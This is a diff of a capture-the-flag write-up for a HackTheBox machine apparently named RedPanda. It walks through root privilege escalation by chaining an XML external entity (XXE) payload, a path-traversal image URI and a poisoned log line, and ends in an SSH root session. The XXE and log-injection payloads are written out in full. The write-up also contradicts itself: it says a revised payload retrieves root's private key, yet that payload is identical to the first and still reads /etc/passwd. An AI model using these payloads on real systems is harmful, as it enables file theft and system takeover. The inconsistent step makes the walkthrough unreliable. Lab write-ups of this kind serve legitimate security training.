@@ -644,36 +644,81 @@ Megapixels                      : 1.1
 2. The xml code for Privilege Escalation.
 [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
 [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
-We will create a file like the this and save file to `pe_credits.xml`
+We will create a file like the this and save file to `pe_creds.xml`
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <credits>
   <author>pe</author>
   <image>
-    <uri>../../../../../../../pe.jpg</uri>
+    <uri>/../../../../../../../../../tmp/pe.jpg</uri>
     <views>4</views>
     <foo>&xxe;</foo>
-  </image>
-  <image>
-    <uri>/img/hungy.jpg</uri>
-    <views>0</views>
-  </image>
-  <image>
-    <uri>/img/smooch.jpg</uri>
-    <views>0</views>
-  </image>
-  <image>
-    <uri>/img/smiley.jpg</uri>
-    <views>1</views>
   </image>
   <totalviews>5</totalviews>
 </credits>
 ```
-3. The log that need to write to `redpanda.log`
+3. The log that need to write to `/opt/panda_search/redpanda.log`
 ```sh
-200||127.0.0.1||curl||../../../../../../../pe.jpg
+200||127.0.0.1||curl||/../../../../../../../../../tmp/pe.jpg
 ```
+
+after 2min we BOOM.
+
+change the `pe_creds.xml` to this one to get private key for `root` user:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<credits>
+  <author>pe</author>
+  <image>
+    <uri>/../../../../../../../../../tmp/pe.jpg</uri>
+    <views>4</views>
+    <foo>&xxe;</foo>
+  </image>
+  <totalviews>5</totalviews>
+</credits>
+```
+
+We save the private key and get the root `flag`.
+
+```sh
+┌──(bop㉿Matrix)-[~/Workspace/hackthebox/RedPanda]
+└─$ ssh -i id_rsa root@10.10.11.170
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 30 Aug 2022 03:57:43 PM UTC
+
+  System load:           0.04
+  Usage of /:            94.0% of 4.30GB
+  Memory usage:          75%
+  Swap usage:            1%
+  Processes:             262
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.170
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:fae2
+
+  => / is using 94.0% of 4.30GB
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Aug 30 11:15:02 2022 from 10.10.14.24
+root@redpanda:~#
+
+```
+Well. 
